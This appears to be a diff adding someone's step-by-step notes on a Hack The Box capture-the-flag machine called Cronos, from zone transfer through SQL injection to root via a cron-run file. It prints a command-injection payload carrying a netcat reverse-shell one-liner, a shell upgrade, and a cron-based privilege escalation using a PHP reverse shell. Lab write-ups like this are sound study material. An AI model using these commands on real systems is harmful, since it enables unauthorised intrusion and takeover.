@@ -1,1 +1,50 @@
 
+https://davidhamann.de/2020/02/02/htb-writeup-cronos/
+
+
+1. Zone transfer
+2. Find domains
+3. Add to host file
+4. Access admin page
+5. Perform SQLi and get access to /welcome.php
+6. Here we can execute commands so add append command using ; by using bash shell
+7. 8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.16.90 443 >/tmp/f
+8. Use netcat listender to get a partically working shell
+9. Upgrade it into a proper shell using 
+
+python -c 'import pty;pty.spawn("/bin/bash");'
+
+10. Proper shell is obtained
+
+11. Download LinEnum.sh from GitHub. Now the file is in Kali local
+Need to send it to target machine to find the vulnerable services
+
+11. It is currently saved in /Downloads location, so start a Python server in same location
+
+python -m SimpleHTTPServer 5555
+
+12. In the target machine, send this file to target machine and run it. Use commands to make it executable
+
+13. After running LinEnum.sh, it shows all the process with root previlages
+
+14. Here we can find a laravel moduce artisan having read write execute permission, 
+got executed by system cron job every 1 minute
+
+15. So navigate to folder that contain the artisan file, replace it with php-reverse-shell
+obtained from https://github.com/pentestmonkey/php-reverse-shell
+
+16. For doing this, use python http server to send file from Kali machine to target. 
+Make sure proper kali OS ip is entered in the shell and also provide it all permissions 
+read-write-execute before sending
+
+17. cp php-rev-shell artisan to replace aritsan file with shell file (it is renamed to artisan)
+
+18. So, cron executes this modified artisan file (shell) every 1 minute
+
+19. Use netcat listener with port number as specified in this shell.
+
+20. Root is obtained
+
+
+
+
